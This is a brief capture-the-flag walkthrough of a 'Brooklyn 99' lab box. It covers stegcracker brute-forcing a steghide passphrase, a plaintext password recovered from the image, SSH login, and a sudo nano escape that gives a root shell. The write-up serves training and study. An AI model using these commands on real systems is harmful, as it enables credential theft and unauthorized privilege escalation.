## Brooklyn 99

## Inspect IP first
Found website. Has image and text. with a comment about steganography

Started inspecting the image.

```
exiftool brooklyn99.jpg 
```
Metadata doesnt show much

```
steghide --extract -sf brooklyn99.jpg 
```
Found a prompt asking for a password

Used stegcracker to try find a password

```
stegcracker brooklyn99.jpg rockyou.txt
```

found the password admin. after finding entering the password into the previous prompt we get
```
Holts Password:
fluffydog12@ninenine

Enjoy!!

```

ssh in using holt@Machineip and we find the flag in user.txt and a nano.save which we dont have permissions for

sudo -l shows we can run nano as sudo

ran the following commands to get root shell 
```
sudo /bin/nano
ctrl-r ctrl-x
reset; bash 1>&0 2>&0
```

once we get a root shell its easy to just go to the root folder to find root.txt
